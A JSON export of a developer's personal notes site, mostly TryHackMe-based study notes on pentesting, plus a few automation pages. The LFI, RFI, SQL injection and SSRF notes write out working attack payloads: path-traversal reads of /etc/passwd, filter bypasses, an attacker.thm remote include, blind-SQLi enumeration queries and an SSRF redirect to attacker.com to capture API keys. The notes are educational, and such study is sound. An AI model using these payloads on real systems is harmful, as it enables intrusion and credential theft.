{"/":{"title":"Home","content":"\n## `whoami`\n\nMy name is Krystian Kościelniak. I’m a proud husband and father to a sneaky toddler.\n\nI [write code](https://github.com/kkoscielniak) for a living, currently at [Pickatale](https://pickatale.com/). Whenever I am not doing that or looking after my kiddo’, I [read](/reading/), learn about [cybersecurity](/cybersecurity/), [web3](/web3/) or try to make sample-based boombap beats.\n\n## What's this place?\n\nThis is my [[others/digital-garden]], my own corner in the web for sharing what I learn in public.\n\nYou may take a look at the folders below, or use `⌘+K` for a site-wide search.\n\n## Wanna talk?\n\nJust drop me \u003ca href=\"mailto:krystiankoscielniak@proton.me\"\u003ean email\u003c/a\u003e, or DM me on [Insta](https://instagram.com/pankoscielniak). I don’t check LinkedIn a lot.\n","lastmodified":"2023-01-10T20:59:18.205284258Z","tags":null},"/automation/":{"title":"Automation","content":"\n\u003e Every great software developer now has an army of robots working for him at nighttime while he or she sleeps, after they’ve written the code, and it’s cranking away.  \n\u003e ~ Naval Ravikant\n\nI tend to automate mundane and repetitive tasks as often as possible through both software and hardware. This, however, is a pretty complex world, so my toolkit and knowledge are limited atm.\n\n## Tools I use\n\n- [[automation/keyboard-maestro|Keyboard Maestro]]\n- Elgato Stream Deck\n- BetterTouchTool\n- Raycast\n- Shortcuts (iOS)\n","lastmodified":"2023-01-10T20:59:18.205284258Z","tags":null},"/automation/favorite-km-macro":{"title":"My favorite KM macro","content":"\n~~I am a beginner music producer.~~ I occasionally play with sample-based boombap beats trying to make something audible. Because of this hobby, my drive is full of jazzy cuts. I wanted to have them synced on my [[MPC Live]] SSD so I can access them in the standalone mode (without the computer connected).\n\nThis was bothersome, because most of the time, whenever the inspiration hit or I had a minute to tinker with music, I needed to connect the MPC to the computer, manually copy the sample packs I've downloaded to the precise location on my MPC SSD, keeping in mind the naming scheme, directory structure, etc. instead of making music.\n\nFortunately, [[automation/keyboard-maestro|Keyboard Maestro]] has this feature to trigger a macro once the drive is attached, and the macro itself can be a command line. This way I can automate the process (to some extent) to sync the `~/Desktop/Beatmaker` directory to my MPC Live.\n\n\u003e [!tip] Note to self: Buy Hazel\n\u003e\n\u003e This could be automated even more with [Hazel](https://www.noodlesoft.com/) - I could automate the process of unarchiving and putting samples in `Beatmaker/` directory.\n\n## How to\n\nThanks to [[tools/terminal/rsync|rsync]], I can sync samples from my computer to the target device pretty easily without having to remove/copy the content that is already on my MPC.\n\n\u003e [!caution] One way syncing\n\u003e\n\u003e `rsync` is great for _one way_ synchronisation. It completely ignores what happens in the target directory, so the one I have on my computer is the _source of truth_ here.\n\nThe macro goes like that. Once the USB device that has `MPC` in name is attached, the following actions are triggered:\n\n1. Cancel all other macros\n   - for some reason, MPC mounts and dismounts few times once connected to Mac. Because of that the macro would run few times and I don't like that. I'm cancelling other macros to make sure `rsync` would run once\n   - This may be tricky to handle once I have more different macros running in the background, but for now it works perfectly\n2. Wait until the `/Volumes/MPC SSD` directory is mounted (_a folder exists_)\n3. Execute this command:\n   ```zsh\n   rsync -aP ~/Desktop/Beatmaker/ /Volumes/MPC\\ SSD/Beatmaker_sync\n   ```\n\nThe results should be shown in Keyboard Maestro's command output window (so I am sure everything went fine).\n\nThe final macro looks like that:\n![[assets/Screenshot 2022-10-22 at 14.57.49.png]]\n\n## Summary\n\nWith new every macro made, I see how much of what I did in front of my computer was mundane, senseless and completely repetible. I am amazed of much of that I can automate by using just one tool.\n\nBy the way, during this write-up, I’ve created another 2 macros - the one that sorts the currently selected lines, so I can sort tags in my Obsidian notes and the one that converts Markdown to Rich Text. **This tool is fucking awesome.**\n","lastmodified":"2023-01-10T20:59:18.205284258Z","tags":null},"/automation/keyboard-maestro":{"title":"Keyboard Maestro","content":"\n[Keyboard Maestro](https://www.keyboardmaestro.com) is an app that allows to automate tasks within macOS. Think: Shortcuts, but on steroids.\n\nI call the Keyboard Maestro macros with hotkeys or with an extension for [[Raycast]], but some triggers can be automated as well, eg. connecting an USB device.\n\n\u003e [!info] In progress\n\u003e\n\u003e I am still learning how to use KM. Hence, my automations are pretty limited at the moment.\n\n## Things I automate\n\n- googling the selected text with **⌘ ⇧ 1**\n- opening Google Maps with the route and ETA to provided destination\n- text expanding\n  - e.g. by typing `;invoice` I make KM to type full message of my typical invoice e-mail\n- translating selected text\n- opening my favorites directories in Finder from everywhere\n- [[automation/favorite-km-macro|copying samples to my MPC Live]] once I connect it to my computer\n- sorting\n- etc. etc.\n\nEven though these examples are basic, it feels right to automate these activities. I've learnt a lot about the application itself whan I was making these scenarios.\n\n## Resources\n\n- [An online course I've learned Keyboard Maestros basics from](https://eduweb.pl/marketing-i-biznes/biznes/keyboard-maestro-automatyzacja-macos) 🇵🇱\n","lastmodified":"2023-01-10T20:59:18.205284258Z","tags":null},"/cybersecurity/":{"title":"Cybersecurity","content":"\nMost of the content here is based on TryHackMe.com resources.\n\n## Resources\n\n- [vulp3cula's hacker's grimoire](https://vulp3cula.gitbook.io/hackers-grimoire/)\n- `/* [...] */`\n","lastmodified":"2023-01-10T20:59:18.205284258Z","tags":null},"/cybersecurity/knowledge/":{"title":"Knowledge","content":"\nHere I keep notes about the _theory of hacking_ for reference.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/":{"title":"Glossary","content":"\nSome useful definitions.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/CA":{"title":"Certificate Authority","content":"`/* [...] */`\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/CSIRT":{"title":"CSIRT","content":"\n_Computer Security Incident Response Team_ is a prearranged group of employees with technical knowledge about the systems and/or [[cybersecurity/knowledge/pentesting/IR|incident]] that happened.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/SOC":{"title":"Security operations center","content":"\n```\n...\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/etc-hosts":{"title":"/etc/hosts","content":"\n`/etc/hosts` file maps domain names to IP addresses.\n\nIn \\*nix:\n\n```\n/etc/hosts\n```\n\nIn Windows:\n\n```\nC:\\Windows\\system32\\drivers\\etc\\hosts\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/hacktivism":{"title":"Hacktivism","content":"\n_Hacktivists_ are activists that use their hacking skills to support social change, human rights, freedom of speech, or environmental causes. These are still cyberattacks.\n\nEven though the hacktivists' motivation may be to help a good cause, these activities are still illegal.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/in-band-out-band":{"title":"In-band vs Out-band","content":"\n## In-band\n\n_In-Band_ refers to the same method of communication being used to exploit the vulnerability and also receive the results\n\nFor example, discovering an [[cybersecurity/knowledge/pentesting/SQLi]] vulnerability on a website page and then being able to extract data from the database to the same page.\n\n## Out-of-band\n\nAn Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results, eg. the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service we control.\n\n1. An attacker makes a request to a website vulnerable to SQL Injection with an injection [[cybersecurity/knowledge/glossary/payload]].\n2. The Website makes a query to the DB which also passes the payload.\n3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the DB.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/payload":{"title":"Payload","content":"\nA _payload_ in malware (or hacking in general) is the part that does the actual damage to an infected computer.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/glossary/vetting":{"title":"Vetting","content":"\n_Vetting_ is a screening process where applicant's backgrounds are examined to establish the risk they pose to the organisation.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/osint/OSINT":{"title":"OSINT","content":"\n_Open-Source INTelligence_\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/":{"title":"Pentesting","content":"\nA _penetration test_ is an ethically-driven, **authorised** attempt to test and analyse the security defences to protect these assets and pieces of information. The pentest involves using the same tools, techniques, and methodologies that someone with malicious intent would use and is similar to an audit.\n\nPrior to pentesting, [[cybersecurity/knowledge/pentesting/SOW|written permission]] must be obtained.\n\n\u003e [!hint] It doesn't have anything to do with testing pens.\n\u003e\n\u003e Glad to help.\n\n## Ethics\n\nPentesters are often faced with potentially morally questionable decisions, eg.\n\n- they are gaining access to a database and being presented with potentially sensitive data\n- performing a phishing attack on an employee to test an organisation's human security\n\n## Hats\n\n- White hats - lawful good guys\n- Grey hats - chaotic good guys\n  - they usually have best intentions, but not always follow the law or ethical standards\n  - [[cybersecurity/knowledge/glossary/hacktivism|hacktivists]]\n- [[cybersecurity/knowledge/pentesting/black-hats|black hats]] - evil ones, criminals\n\n## Methodologies\n\nA practical methodology is a smart one, where the steps taken are relevant to the situation at hand.\n\nNo pentest is the same, but there's a general theme of the following stages:\n\n1. Information Gathering - [[cybersecurity/knowledge/osint/OSINT]] and research of the target organisation. This does not involve scanning any systems.\n2. Enumeration/Scanning - discovering applications and services running on the systems, e.g. finding a web server that may be potentially vulnerable.\n3. Exploitation - leveraging vulnerabilities discovered on a system or application; can involve the use of public exploits or exploiting application logic.\n   - successful exploit is know as the _foothold_\n4. Privilege Escalation - the attempt to expand the access to a system. You can escalate horizontally and vertically:\n   - horizontally - accessing another account of the same permission group (i.e. another user),\n   - vertically - accessing another permission group (i.e. an `root`).\n5. Post-exploitation\n   1. What other hosts can be targeted (pivoting)\n   2. What additional information can we gather from the host now that we are a privileged user\n   3. Covering tracks\n   4. Reporting\n\n## Frameworks\n\n- [[OSSTMM]]\n- [[OWASP]]\n- [[NIST Cybersecurity Framework 1.1]]\n- [[NCSC CAF]]\n\n## Scopes of testing\n\nYour understanding of your target will determine the level of testing that you perform in your penetration testing engagement.\n\n- Black Box Testing - zero knowledge, eg. only the URL of the application, or list of IP addresses\n  - a high-level process\n  - the tester is not given any information about the inner workings of the application or service\n  - the tester acts as a regular user\n  - can involve interacting with the interface to see whether the intended result is returned\n  - no specific knowledge\n  - time consuming in terms of information gathering and enumeration\n  - [[cybersecurity/knowledge/osint/OSINT]] is quite important within this scope, as the pentester might need to do lots of reconneisance\n- Gray Box Testing - partial knowledge\n  - the most popular in pentesting\n  - combination of both black-box and white-box testing processes\n  - the tester has limited knowledge of the internal components the tested piece\n  - it's still interacting with the application as if it were a black-box scenario and then using the knowledge to try and resolve issues found\n  - the limited knowledge given saves time, and **is often chosen for extremely well-hardened attack surfaces**.\n- White Box Testing - full knowledge\n  - a low-level process usually done by a software developer who knows programming and application logic\n  - The tester tests the internal components of the tested piece, e.g. ensuring that specific functions work correctly and within a reasonable amount of time\n  - much more time consuming than black-box testing\n  - the full knowledge in a White-Box testing scenario provides a testing approach that guarantees **the entire attack surface** can be validated\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/IR":{"title":"Incident Response","content":"\nAn _incident_ is a breach of security. Actions taken to resolve and remediate the threat are known as _Incident Response_.\n\nIncidents are classified using a rating of urgency and impact. Urgency is determined by the type of attack faced. Impact is determined by the affected system and what impact that has on business operations.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/ab0cc8478b0bce9a400187f559d36dd6.png)\n\nAn incident is responded to by [[cybersecurity/knowledge/glossary/CSIRT]]).\n\n## Phases\n\nThere are 6 phases of IR:\n\n- Preparation\n  - Do we have the resources and plans in place to deal with the security incident?\n- Identification\n  - Has the threat and the threat actor been correctly identified in order for us to respond to?\n- Containment\n  - Can the threat/security incident be contained to prevent other systems or users from being impacted?\n- Eradication\n  - Remove the active threat.\n- Recovery\n  - Perform a full review of the impacted systems to return to business as usual operations.\n- Lessons Learned\n  - What can be learnt from the incident?\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/LFI":{"title":"Local File Inclusion","content":"\n_Local File Inclusion_ attacks against web applications are often possible due to a developers' lack of security awareness.\n\nWith PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications.\n\nLFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as [[cybersecurity/knowledge/pentesting/path-traversal]].\n\n## Example\n\nSuppose the web application provides two languages, and the user can select between the EN and AR\n\n```php\n\u003c?php\n\tinclude($_GET[\"lang\"]);\n?\u003e\n```\n\nThe PHP code above uses a **GET request** via the URL parameter `lang` to **include** the file of the page.\n\n```\nhttp://webapp.com/index.php?lang=EN.php\nhttp://webapp.com/index.php?lang=AR.php\n```\n\nTheoretically, we can access and display any readable file on the server from the code above if there isn't any input validation:\n\n```\nhttp://webapp.com/index.php?lang=/etc/passwd\n```\n\n## Example #2\n\nThe developer might decided to specify the directory inside the function:\n\n```php\n\u003c?PHP\n\tinclude(\"languages/\". $_GET['lang']);\n?\u003e\n```\n\nIn the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.\n\nIf there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.\n\nThe `include` function allows us to include any called files into the current page. The following will be the exploit:\n\n```\nhttp://webapp.com/index.php?lang=../../../../etc/passwd\n```\n\n## Example #3\n\nIn the first two cases, we _checked_ the code for the web app, and then we knew how to exploit it. In case of [[black-box-testing]], we need to take a look of the error messages in order to understand how the data is passed and processed into the web app, eg:\n\n```\nWarning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/**THM-4**/index.php on line 12\n```\n\nThe error message discloses what the include function looks like:  `include(languages/THM.php);`\n\nWe can tell the function that includes files in the languages directory is adding `.php` at the end of the entry. Thus the valid input will be something like `index.php?lang=EN`, where the file EN is located inside the given `languages/` and named  `EN.php`.\n\nFrom the error message we also know the full web application directory which is `/var/www/html/THM-4/`\n\nTo exploit this, we need to use the [[cybersecurity/knowledge/pentesting/path-traversal|dot-dot-slash trick]] to get out the current folder:\n\n```\nhttp://webapp.com/index.php?lang=../../../../etc/passwd\n```\n\nWe already knew the `/var/www/html/THM-4` path has four levels, but we still receive the error:\n\n```\nWarning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12\n```\n\nThe error tells us that the developer specifies the file type to pass to the `include` function (namely it has to end with `.php`). To go around that, we need to use [[cybersecurity/knowledge/pentesting/null-byte]] injection:\n\n```\nhttp://webapp.com/index.php?file=../../../../etc/passwd%00\n```\n\n## Example #4 - filtered keywords\n\nLet's say the developer decided to filter keywords to avoid disclosing sensitive information and the `/etc/passwd` file has been filtered.\n\nThere are two possible methods to bypass the filter.\n\n- by using the [[cybersecurity/knowledge/pentesting/null-byte|null byte %00]]\n- the current directory [[cybersecurity/knowledge/pentesting/path-traversal]] trick at the end of the filtered keyword (`/.`)\n\nThe exploit will be similar to ```\n\n```\nhttp://webapp.thm/index.php?lang=/etc/passwd/.\n```\n\nIf we try `/etc/passwd/..`, it results to be  `/etc/` and that's because we moved one to the root. If we try `/etc/passwd/.`, the result will be `/etc/passwd` since dot refers to the current directory.\n\n## Example #5 - input validation\n\n---\n\nLet's say the developer starts to use input validation by filtering some keywords out of it.\n\n```\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n```\n\nBy using such URL, we got the following error:\n\n```php\nWarning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15\n```\n\nFrom the error message we know that the web application replaces the `../` with the empty string (it defaults the fn call to `include(languages/etc/passwd`).\n\nThere are a couple of techniques we can use to bypass this.\n\nWe can send the following [[cybersecurity/knowledge/glossary/payload]] to bypass it: `....//....//....//....//....//etc/passwd`, as the PHP filter only matches and replaces **the first subset** string it finds (`../`) and doesn't do another pass, turning\n\n```\n..//....//....//....//etc/passwd\n```\n\ninto\n\n```\n../../../../etc/passwd\n```\n\n## Example 6 - forced directory\n\nIf the developer forces the `include` fn to read from a defined directory, namely, if the web application asks to supply input that has to include a directory such as\n\n```\nhttp://webapp.thm/index.php?lang=languages/EN.php\n```\n\nthen, to exploit this, we need to include the directory in the [[cybersecurity/knowledge/glossary/payload]] like so:\n\n```\n?lang=languages/../../../../../etc/passwd\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/RFI":{"title":"Remote File Inclusion","content":"\n_Remote File Inclusion_ is a technique to include remote files and into a vulnerable application. Like [[cybersecurity/knowledge/pentesting/LFI|Local File Inclusion]], the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function.\n\nOne requirement for RFI is that the `allow_url_fopen` option needs to be on.\n\nThe risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain [[Remote Command Execution (RCE)]] on the server. Other consequences of a successful RFI attack include:\n\n- Sensitive Information Disclosure\n- Cross-site Scripting ([[XSS]])\n- Denial of Service ([[DoS]])\n\nAn external server hosting malicious files must communicate with the application server for a successful RFI attack. The malicious file is injected into the `include` fn via HTTP requests, and the content of the malicious file executes on the vulnerable application server.\n\n## Example\n\nLet's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt` where cmd.txt contains PHP code:\n\n```php\n\u003c?php echo \"Hello World\"; ?\u003e\n```\n\nFirst, the attacker injects the malicious URL, which points to the attacker's server, such as\n\n```\nhttp://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt\n```\n\nIf there is no input validation, then the malicious URL passes into `include`. Next, the web app server will send a `GET` request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/ROE":{"title":"Rules of Engagement","content":"\n_Rules of Engagement_ is a document that is created at the initial stages of a pentesting engagement. This document consists of three main sections, which are are ultimately responsible for deciding how the engagement is carried out.\n\n\u003e [!tip] It's not the same as [[cybersecurity/knowledge/pentesting/SOW]]\n\u003e\n\u003e This might be a bit tricky, but SOW is what you promise to do and ROE is what you promise **not** to do.\n\n- Permission\n  - gives explicit permission for the engagement to be carried out This permission is essential to legally protect individuals and organisations for the activities they carry out.\n- Test Scope\n  - annotates specific targets to which the engagement should apply (e.g. certain servers, or apps, but not the entire network)\n- Rules\n  - defines **exactly** the techniques that are permitted during the engagement, e.g. phishing attacks are prohibited, but MITM is okay\n\n## Resources\n\n- [ROE example by SANS institute](https://sansorg.egnyte.com/dl/bF4I3yCcnt/)\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/SOW":{"title":"Statement of Work","content":"\nBefore a pentest starts, a formal discussion occurs between the pentester and the system owner.The tools, techniquest and targets are agreed on. The resulting documentm, called the _statement of work_ (SOW) includes verbiage giving pentesters permission to perform the pentest.\n\nAnything that falls outside of this agreement is **considered unauthorised**.\n\n## _get-out-of-jail-free_ card\n\nSOW can also offer legal protection if you make certain mistakes within the scope defined by the SOW.\n\nThis is especially necessary when performing pentests against buildings, as it may be useful when being questioned by building security or law enforcement.\n\nAlso, pentesting services companies are held against legal frameworks and industry accreditation.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/SQLi":{"title":"SQLi","content":"\n_[[development/databases/mysql-cheatsheet|SQL]] Injection_ is an attack on a web application DB server that causes malicious queries to be executed through the input that hasn't been properly validated.\n\nMalicious queries can be used to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.\n\n## Example of SQLi\n\nWe have a blog post that is available under the URL:\n\n```\nhttps://website.thm/blog?id=1\n```\n\nWe can see that the blog entry is selected with the `id` query param. We can guess the SQL statement used to retrieve the article from the DB is something like this:\n\n`SELECT * from blog where id=1 and private=0 LIMIT 1;`\n\nSQL Injection is introduced when **user input is introduced into the DB query**, In this case, it's the `id` parameter.\n\nLet's pretend article `id=2` is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:\n\n```sh\nhttps://website.thm/blog?id=2;--\n```\n\nWhich would then, in turn, produce the SQL statement:\n\n```sql\nSELECT * from blog where id=2;-- and private=0 LIMIT 1;\n```\n\n## In-band SQLi\n\n_[[cybersecurity/knowledge/glossary/in-band-out-band|In-Band]] SQL Injection_ is the easiest type to detect and exploit.\n\n### Error-Based SQL Injection\n\nObtaining information about the DB structure as error messages from the DB printed directly to the browser screen.\n\nThe key to **discovering** error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced (most commonly `'` or `\"`).\n\n### Union-Based SQL Injection\n\nThis type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page.\n\n## Blind SQLi\n\n_Blind SQLi_ is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not. This is because the error messages have been disabled, but the injection still works regardless. All we need is a **little bit of feedback** to successful enumerate a whole DB.\n\n### Authentication Bypass\n\nOften times login forms that are connected to a DB of users aren't interested in the content of the username and password but more whether the two make a matching pair in the users table.\n\nWith that in mindy, it's unnecessary to enumerate a valid username/password pair. We just need to create a DB query that replies with a `true`.\n\nLet's say we have the query:\n\n```sql\nselect * from users where username='%username%' and password='%password%' LIMIT 1;\n```\n\nTo make this into a query that always returns as true, we can enter the following into the password field:\n\n```sql\n' OR 1=1;--\n```\n\nWhich turns the SQL query into the following:\n\n```sql\nselect * from users where username='' and password='' OR 1=1;\n```\n\n`1=1` is a true statement so the query will _return_ `true`.\n\n### Boolean-based Blind SQLi\n\n_Boolean-based_ SQLi refers to the response we receive back from our injection attempts which is `boolean` (in any form). That boolean value says if SQL Injection [[cybersecurity/knowledge/glossary/payload]] was successful or not.\n\nWith just two possible outcomes, it's possible to enumerate a whole DB structure and contents.\n\nLet's say we have the SQL query that processes the login form to see if the username is already _taken_:\n\n```sql\nselect * from users where username = '%username%' LIMIT 1;\n```\n\nAnd we have the _boolean_ response in form of error message saying that the username is taken.\n\n```json\n{\n  \"taken\": true\n}\n```\n\nFirst, we establish the number the number of columns in the `users` table with [[development/databases/mysql-cheatsheet#UNION|UNION]] statement:\n\n```sql\nadmin123' UNION SELECT 1;--\n```\n\nIf `taken === false`, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have `taken === true`:\n\n```sql\nadmin123' UNION SELECT 1,2,3;--\n```\n\nWhen the number of columns has been established, we can work on the enumeration of the DB.\n\nFirst, we need to discover the DB name. We can do this by using the built-in [[development/databases/mysql-cheatsheet#database()|database()]] method and then using the [[development/databases/mysql-cheatsheet#UNION|UNION]] operator to try and find results that will return a true status:\n\n```sql\nadmin123' UNION SELECT 1,2,3 where database() like 'a%';--\n```\n\n`In the example above, we try to see if the DB name starts with`a`. We can cycle through all the letters, numbers and `-`and`_` characters until we discover a match. Thanks to that we can \\_brute-force_ the name of the DB.\n\nWhen we have established the DB name, we can use it to enumerate table names using a similar method by utilising the [[development/databases/mysql-cheatsheet#information_schema|information_schema]] DB:\n\n```sql\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'a%';--`\n```\n\nThis query looks for results in the `information_schema` DB in the `tables` table where the DB name matches `sqli_three`, and the table name begins with `a`. Like previously, we'll need to cycle through letters, numbers and characters until a positive match.\n\nLet's say we've discovered a `users` table in the `sqli_three` DB this way. We can confirm its existence with the following username [[cybersecurity/knowledge/glossary/payload]]:\n\n```sql\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\n```\n\nLastly, we need to enumerate the column names in the `users` table so we can properly search it for login credentials. Again using the `information_schema` DB and the information we've already gained, we can start querying it for column names. Using the [[cybersecurity/knowledge/glossary/payload]] below, we search the `columns` table where the DB is equal to `sqli_three`, the table name is `users`, and the column name begins with `a`.\n\n```sql\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`\n```\n\nAs we're looking for multiple results, we'll have to add this to our [[cybersecurity/knowledge/glossary/payload]] each time we find a new column name, not to keep discovering the same one:\n\n```sq\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`\n```\n\nLet's assume we've enumerated 3 columns this way: `id`, `username` and `password`. Now we can use them to query the `users` table for login credentials, starting with `username`, then `password`:\n\n```sql\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\n\n-- username is `admin`\nadmin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%\n```\n\n## Time-based SQLi\n\nA _time-based_ blind SQL Injection is very similar to the [[cybersecurity/knowledge/pentesting/SQLi#Boolean-based Blind SQLi|Boolean-based Blind SQLi]]. The same requests are sent, and there is no visual indicator queries being right. In this case however, the indicator of a correct query is based on **the time the query takes to complete**.\n\nThis time delay is introduced by using built-in methods such as [[development/databases/mysql-cheatsheet#sleep(x)|sleep()]] alongside the [[development/databases/mysql-cheatsheet#UNION|UNION]] statement. `sleep` will only get executed upon a successful `UNION SELECT` statement, for example:\n\n```sql\nadmin123' UNION SELECT SLEEP(5);--\n```\n\nIf there was no pause in the response time, we know that the query was unsuccessful, so we add another column:\n\n```sql\nadmin123' UNION SELECT SLEEP(5),2;--\n```\n\nThis payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.\n\nThanks to that we could go through enumeration process similar to the one in the [[#Boolean-based Blind SQLi]], adding the `SLEEP()` method into the `UNION SELECT` statement:\n\n```\nreferrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`\n```\n\n## Out-of-band SQLi\n\n_[[cybersecurity/knowledge/glossary/in-band-out-band|Out-of-Band]]_ SQLi isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.\n\n## Preventing SQLi\n\n- Prepared Statements (With Parameterized Queries):\n  - the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards\n    - this ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data\n- Input validation\n  - an allow list can restrict input to only certain strings\n  - a string replacement method in the programming language can filter the disallowed characters out\n- Escaping User Input\n  - prepending a `\\` to special characters characters causes them to be parsed just as a regular string and not a special character\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/SSRF":{"title":"Server-side Request Forgery","content":"\n_Server-side Request Forgery_ is a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.\n\n## Types of SSRF\n\nThere are two types of SSRF vulnerability:\n\n- a regular SSRF - data is returned to the attacker's screen\n- _blind SSRF_ - an SSRF occurs, but no information is returned to the attacker's screen\n\n## Impact\n\nA successful SSRF attack can result in any of the following:\n\n- Access to unauthorised areas\n- Access to customer/organisational data\n- Ability to Scale to internal networks\n- Reveal authentication tokens/credentials\n\n## Examples\n\n### URL manipulation\n\nThe client expects similar request:\n\n```http\nhttp://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123\n```\n\nBy modifying the `url` query param, we might want to access different API endpoints, e.g.:\n\n```http\n# hacker requests\nhttp://website.thm/stock?url=http://api.website.thm/api/user\n\n# client request the server\nhttp://api.website.thm/api/user\n\n# server returns the user data instead of stock information\n```\n\n### With [[cybersecurity/knowledge/pentesting/path-traversal]]\n\nThe client expects similar request:\n\n```http\nhttp://website.thm/stock?url=/item?id=123\n```\n\nEven if we have control over the path, not the whole URL, by modifying the `url` param, we might want to access different API endpoints, e.g.:\n\n```http\n# hacker requests\nhttp://website.thm/stock?url=/../user\n\n# client request the server\nhttp://api.website.thm/api/stock/../user\n\n# server returns the user data instead of stock information\n```\n\n### Controlling the server's subdomain\n\nThe client expects similar request:\n\n```http\nhttp://website.thm/stock?server=api\u0026id=123\n```\n\n```http\n# hacker requests\nhttp://website.thm/stock?server=api.website.thm/api/user\u0026x=\u0026id=123\n                                [-------------------------]\n\n# client request the server\nhttp://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123\n     [----------------------------]                              [-]\n\n# server returns the user data instead of stock information\n```\n\nWe can control the server's subdomain to which the request is made (from `server` to `api.website.thm/api/user`).\n\nThe [[cybersecurity/knowledge/glossary/payload]] ending with `\u0026x=` is used to stop the remaining path from being appended to the end of the URL and turns into parameter itself.\n\n### Forcing webapp to request another server\n\nThe attacker can force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by `website.thm` (that would normally authenticate to `api.website.thm`).\n\nThe client expects similar request:\n\n```http\nhttp://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123\n```\n\n```http\n# hacker requests\nhttp://website.thm/stock?url=http://attacker.com/\n\n# webapp requests data from `attacker.com` revealing the API key\n```\n\n## Finding a SSRF\n\nSSRF vulnerabilities can be spotted in many different ways. Common examples:\n\n- A full URL used as a parameter in the address bar\n  - `https://website.thm/form?server=http://server.website.thm/store`\n- A partial URL such as just the hostname\n  - `https://website.thm/form?server=api`\n- Path of the URL\n  - `https://website.thm/form?dst=/forms/contact`\n- In a hidden field in a form\n\nSome of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working [[cybersecurity/knowledge/glossary/payload]].\n\nIf working with a blind SSRF the output is not reflected back to us, so we'll need an external HTTP logging tool to monitor requests:\n\n- [RequestBin](https://requestbin.com)\n- your own HTTP server\n- [[cybersecurity/knowledge/tools/burp|Burp Suite]]'s Collaborator client.\n\n## Bypassing SSRF defenses\n\nSecurity-savvy developers aware of the SSRF may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, as follows:\n\n### _Deny 